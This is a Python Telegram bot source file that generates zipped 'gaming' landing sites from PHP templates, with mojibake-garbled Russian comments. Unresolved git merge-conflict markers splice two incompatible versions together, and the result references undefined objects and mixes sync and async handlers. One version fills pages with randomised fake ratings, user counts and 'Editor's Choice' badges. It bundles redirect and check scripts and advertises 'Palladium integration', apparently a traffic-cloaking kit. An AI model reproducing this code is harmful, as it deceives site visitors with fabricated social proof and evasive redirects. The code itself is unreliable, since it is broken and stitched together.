import os
import json
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import threading
import time
import subprocess
import sys
import pytz
from datetime import datetime
import zipfile
import io
import random
import string
<<<<<<< HEAD
import tempfile
import shutil

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã
TIMEZONE = pytz.timezone('Europe/Moscow')
RESTART_INTERVAL = 6 * 60 * 60  # 6 —á–∞—Å–æ–≤ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö
VERSION = "2.2.0"

# –°–ø–∏—Å–æ–∫ —Å—Ç–∏–ª–µ–π
STYLES = ["classic", "dark", "neon", "gradient", "minimal"]

# –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        logger.error("–§–∞–π–ª config.json –Ω–µ –Ω–∞–π–¥–µ–Ω")
        sys.exit(1)
    except json.JSONDecodeError:
        logger.error("–û—à–∏–±–∫–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ config.json")
        sys.exit(1)

config = load_config()
TOKEN = config.get('token')
if not TOKEN:
    logger.error("–¢–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ config.json")
    sys.exit(1)

ALLOWED_USERS = config.get('allowed_users', [])

def randomize_content(content):
    """–†–∞–Ω–¥–æ–º–∏–∑–∏—Ä—É–µ—Ç –∫–æ–Ω—Ç–µ–Ω—Ç —Å–∞–π—Ç–∞"""
    # –í—ã–±–∏—Ä–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–π —Å—Ç–∏–ª—å
    style = random.choice(STYLES)
    content = content.replace('<body>', f'<body class="{style}">')
    
    return content

def generate_site(theme=None):
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–∞–π—Ç —Å –∑–∞–¥–∞–Ω–Ω–æ–π —Ç–µ–º–æ–π"""
    try:
        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
        with tempfile.TemporaryDirectory() as temp_dir:
            # –ö–æ–ø–∏—Ä—É–µ–º —à–∞–±–ª–æ–Ω—ã
            templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
            for file in os.listdir(templates_dir):
                if file.endswith(('.php', '.css', '.html')):
                    shutil.copy2(
                        os.path.join(templates_dir, file),
                        os.path.join(temp_dir, file)
                    )
            
            # –†–∞–Ω–¥–æ–º–∏–∑–∏—Ä—É–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç
            index_path = os.path.join(temp_dir, 'index.php')
            with open(index_path, 'r') as f:
                content = f.read()
            
            content = randomize_content(content)
            
            with open(index_path, 'w') as f:
                f.write(content)
            
            # –°–æ–∑–¥–∞–µ–º ZIP-–∞—Ä—Ö–∏–≤
            zip_path = os.path.join(temp_dir, 'site.zip')
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        if file != 'site.zip':
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, temp_dir)
                            zipf.write(file_path, arcname)
            
            return zip_path
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–∞–π—Ç–∞: {e}")
        return None
=======
import json
import subprocess
import signal
import time
import threading
from datetime import datetime

VERSION = "2.2.0"

# –í–∞—Ä–∏–∞–Ω—Ç—ã –¥–ª—è —Ä–∞–Ω–¥–æ–º–∏–∑–∞—Ü–∏–∏
SITE_TITLES = [
    "Premium Gaming Universe 2025",
    "Elite Gaming World 2025",
    "Ultimate Gaming Zone 2025",
    "Pro Gaming Hub 2025",
    "Gaming Paradise 2025",
    "Gaming Masters 2025",
    "Gaming Legends 2025",
    "Gaming Empire 2025"
]

GAME_NAMES = [
    "NexusPlay",
    "GameVortex",
    "PlayMaster",
    "GamePulse",
    "PlayNova",
    "GameForge",
    "PlayPrime",
    "GameNexus",
    "PlayElite",
    "GameSphere"
]

BADGES = [
    ["Elite Choice", "Premium Pick", "Top Rated", "Best Choice", "Editor's Choice"],
    ["3M+ Users", "5M+ Players", "2M+ Gamers", "4M+ Active", "1M+ Daily"]
]

def randomize_content(template):
    """–ó–∞–º–µ–Ω—è–µ—Ç —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç –Ω–∞ —Å–ª—É—á–∞–π–Ω—ã–π"""
    # –°–ª—É—á–∞–π–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
    title = random.choice(SITE_TITLES)
    game_name = random.choice(GAME_NAMES)
    badge1 = random.choice(BADGES[0])
    badge2 = random.choice(BADGES[1])
    rating = f"{random.uniform(4.5, 5.0):.1f}"
    users = f"{random.randint(1, 5)}M+"
    langs = str(random.randint(20, 50))
    
    # –ó–∞–º–µ–Ω—ã –≤ —à–∞–±–ª–æ–Ω–µ
    template = template.replace("Premium Gaming Universe 2025", title)
    template = template.replace("NexusPlay", game_name)
    template = template.replace("Elite Choice", badge1)
    template = template.replace("3M+ Users", badge2)
    template = template.replace("‚≠ê 4.9", f"‚≠ê {rating}")
    template = template.replace("üë• 3M+ active", f"üë• {users} active")
    template = template.replace("üåç 30 langs", f"üåç {langs} langs")
    
    return template

# –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –∏–∑ JSON
with open('config.json', 'r') as f:
    config = json.load(f)

# –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ –∏ —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
TOKEN = config.get('token')
ALLOWED_USERS = config.get('allowed_users', [])

def generate_site(theme=None):
    """–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–∞–π—Ç–∞ —Å –≥–æ—Ç–æ–≤—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏ –∏–∑ templates"""
    files = {}
    template_files = [
        'index.php',
        'redirect.php',
        'config.php',
        'jmpDG.php',
        'styles.css',
        'privacy.php',
        'terms.php',
        'check.php'
    ]
    
    for file in template_files:
        with open(f'templates/{file}', 'r') as f:
            content = f.read()
            # –ü—Ä–∏–º–µ–Ω—è–µ–º —Ä–∞–Ω–¥–æ–º–∏–∑–∞—Ü–∏—é —Ç–æ–ª—å–∫–æ –∫ index.php
            if file == 'index.php':
                content = randomize_content(content)
            files[file] = content
    
    return files
>>>>>>> bbe2c17869f75ab1b0ed0e2a1e7eaf15cb6e208b

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ALLOWED_USERS:
        await update.message.reply_text("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.")
        return
    
<<<<<<< HEAD
    await update.message.reply_text(
        "–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–∞–π—Ç–æ–≤.\n"
        "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n"
        "/generate - –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Å–∞–π—Ç\n"
        "/theme [—Ü–≤–µ—Ç] - –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–µ–º—É —Å–∞–π—Ç–∞\n"
        "/update - –û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞"
=======
    update.message.reply_text(
        f"üéÆ Gaming Site Generator v{VERSION}\n\n"
        "Available commands:\n"
        "/generate - create site with random theme\n"
        "/theme [color] - create site with specific color theme\n"
        "/update - update bot to latest version\n"
        "/restart - restart bot service\n\n"
        "Available colors: purple, blue, cyber, neon, sunset, forest, cherry, midnight, aurora, volcano, galaxy, ocean\n\n"
        "üéØ All sites include:\n"
        "- Responsive design\n"
        "- Palladium integration\n"
        "- Tracking parameters\n"
        "- Mobile optimization"
>>>>>>> bbe2c17869f75ab1b0ed0e2a1e7eaf15cb6e208b
    )

async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ALLOWED_USERS:
        await update.message.reply_text("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.")
        return
    
    try:
        zip_path = generate_site()
        if zip_path:
            with open(zip_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename='site.zip',
                    caption='–í–∞—à —Å–∞–π—Ç –≥–æ—Ç–æ–≤!'
                )
            os.remove(zip_path)
        else:
            await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–∞–π—Ç–∞.")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–∞–π—Ç–∞: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–∞–π—Ç–∞.")

async def theme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ALLOWED_USERS:
        await update.message.reply_text("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.")
        return
    
    if not context.args:
        await update.message.reply_text("–£–∫–∞–∂–∏—Ç–µ —Ü–≤–µ—Ç —Ç–µ–º—ã. –ù–∞–ø—Ä–∏–º–µ—Ä: /theme blue")
        return
    
    color = context.args[0].lower()
    try:
        zip_path = generate_site(color)
        if zip_path:
            with open(zip_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename='site.zip',
                    caption=f'–°–∞–π—Ç —Å —Ç–µ–º–æ–π {color} –≥–æ—Ç–æ–≤!'
                )
            os.remove(zip_path)
        else:
            await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–∞–π—Ç–∞.")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ —Ç–µ–º—ã: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ —Ç–µ–º—ã.")

async def update_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) not in ALLOWED_USERS:
        await update.message.reply_text("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.")
        return
    
    try:
        from update_from_github import update_from_github
        success = update_from_github()
        if success:
            await update.message.reply_text("–ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω! –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫...")
            subprocess.Popen(['python3', 'restart.py'])
        else:
            await update.message.reply_text("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –±–æ—Ç–∞.")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –±–æ—Ç–∞: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –±–æ—Ç–∞.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"–û—à–∏–±–∫–∞: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")

def auto_restart():
    while True:
        time.sleep(RESTART_INTERVAL)
        logger.info("–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
        subprocess.Popen(['python3', 'restart.py'])

def update_command(update, context):
    if update.message.from_user.username not in ALLOWED_USERS:
        update.message.reply_text("‚õî Access denied")
        return
    
    update.message.reply_text("üîÑ Starting update from GitHub...")
    try:
        # –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º —Ñ—É–Ω–∫—Ü–∏—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
        from update_from_github import update_files
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
        success = update_files()
        
        if success:
            update.message.reply_text(f"‚úÖ Update completed successfully!\n‚ú® Current version: v{VERSION}\nüîÑ Restarting bot...")
            
            # –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª-—Ç—Ä–∏–≥–≥–µ—Ä –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
            with open('restart_trigger', 'w') as f:
                f.write(f'update_restart_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
            
            # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å
            os.kill(os.getpid(), signal.SIGTERM)
        else:
            update.message.reply_text("‚ùå Update failed, check server logs for details")
            
    except Exception as e:
        update.message.reply_text(f"‚ùå Error during update: {str(e)}")

def restart_command(update, context):
    if update.message.from_user.username not in ALLOWED_USERS:
        update.message.reply_text("‚õî Access denied")
        return
    
    update.message.reply_text("üîÑ Restarting bot...")
    try:
        # –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª-—Ç—Ä–∏–≥–≥–µ—Ä –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
        with open('restart_trigger', 'w') as f:
            f.write(f'manual_restart_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
        
        # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å
        os.kill(os.getpid(), signal.SIGTERM)
        
    except Exception as e:
        update.message.reply_text(f"‚ùå Error during restart: {str(e)}")

def auto_restart():
    """–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ –∫–∞–∂–¥—ã–µ 10 –º–∏–Ω—É—Ç"""
    while True:
        time.sleep(600)  # 10 –º–∏–Ω—É—Ç
        try:
            # –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª-—Ç—Ä–∏–≥–≥–µ—Ä –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
            with open('restart_trigger', 'w') as f:
                f.write(f'auto_restart_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
            
            print(f"Auto-restart triggered at {datetime.now()}")
            # –ó–∞–≤–µ—Ä—à–∞–µ–º —Ç–µ–∫—É—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å
            os.kill(os.getpid(), signal.SIGTERM)
        except Exception as e:
            print(f"Error in auto_restart: {str(e)}")

def log_restart(update, context):
    if os.path.exists('restart.log'):
        with open('restart.log', 'a') as f:
            f.write(f"{datetime.now()}: Bot restarted\n")
    else:
        with open('restart.log', 'w') as f:
            f.write(f"{datetime.now()}: Bot started\n")

def main():
<<<<<<< HEAD
    # –°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
    application = Application.builder().token(TOKEN).build()
    
    # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("generate", generate))
    application.add_handler(CommandHandler("theme", theme))
    application.add_handler(CommandHandler("update", update_bot))
    application.add_error_handler(error_handler)
    
    # –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
    restart_thread = threading.Thread(target=auto_restart)
    restart_thread.daemon = True
    restart_thread.start()
    
    # –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
    logger.info(f"Bot started v{VERSION}")
    application.run_polling()
=======
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —Ñ–∞–π–ª–∞-—Ç—Ä–∏–≥–≥–µ—Ä–∞ –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
    if os.path.exists('restart_trigger'):
        os.remove('restart_trigger')
        time.sleep(1)  # –î–∞–µ–º –≤—Ä–µ–º—è –Ω–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å—Ç–∞—Ä–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞

    # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
    restart_thread = threading.Thread(target=auto_restart, daemon=True)
    restart_thread.start()
    
    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–æ—Ç–∞
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("generate", generate_site_command))
    dp.add_handler(CommandHandler("theme", theme_command))
    dp.add_handler(CommandHandler("update", update_command))
    dp.add_handler(CommandHandler("restart", restart_command))
    
    # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–æ–≤
    dp.add_handler(MessageHandler(Filters.status_update.new_chat_members, log_restart))

    print(f"Bot started v{VERSION}")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    updater.start_polling()
    updater.idle()
>>>>>>> bbe2c17869f75ab1b0ed0e2a1e7eaf15cb6e208b

if __name__ == '__main__':
    main() 